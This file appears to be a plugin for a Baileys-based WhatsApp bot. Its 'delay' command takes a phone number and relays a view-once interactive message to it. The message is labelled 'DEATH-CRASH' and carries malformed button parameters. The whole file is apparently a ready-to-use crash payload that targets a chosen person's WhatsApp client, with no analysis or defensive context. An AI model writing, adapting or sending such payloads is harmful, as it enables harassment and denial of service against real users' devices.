import { generateWAMessageFromContent } from '@whiskeysockets/baileys'

let handler = async (m, { conn, args, text, command }) => {
  if (!text) return m.reply(`📌 Usa così:\n.${command} numero\n\nEsempio:\n.${command} 393471234567`)

  // costruisci il jid del target
  let target = `${text.replace(/[^0-9]/g, '')}@s.whatsapp.net`

  try {
    let msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𝐃𝐄𝐀𝐓𝐇-𝐃𝐎𝐌𝐈𝐍𝐀 ۞",
              hasMediaAttachment: false
            },
            body: {
              text: "𝐃𝐄𝐀𝐓𝐇-𝐂𝐑𝐀𝐒𝐇"
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "z"
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }
              ]
            }
          }
        }
      }
    }, {})

    await conn.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
    })

    m.reply(`✅ Inviato a ${text}`)

  } catch (e) {
    console.error(e)
    m.reply("❌ Errore durante l'invio")
  }
}

handler.command = /^delay$/i
handler.help = ['delay <numero>']
handler.tags = ['tools']

export default handler